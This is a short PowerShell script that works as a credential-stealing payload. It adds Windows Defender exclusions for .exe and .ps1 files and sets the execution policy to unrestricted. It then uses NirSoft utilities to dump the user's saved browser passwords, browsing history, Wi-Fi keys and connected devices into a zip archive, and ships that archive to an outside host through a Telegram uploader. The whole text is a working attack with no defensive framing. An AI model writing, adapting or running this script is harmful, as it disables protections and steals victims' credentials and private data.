Set-Location C:\Users\Public\Documents 
Add-MpPreference -ExclusionExtension exe -Force
Add-MpPreference -ExclusionExtension ps1 -Force
Set-ExecutionPolicy unrestricted -Force
New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory
.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt 
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt
.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt 
.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt 
Start-Sleep -Seconds 60 
Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
Compress-Archive dump/ dump.zip
./telegram_uploader.exe -f dump.zip -c "flag here!"
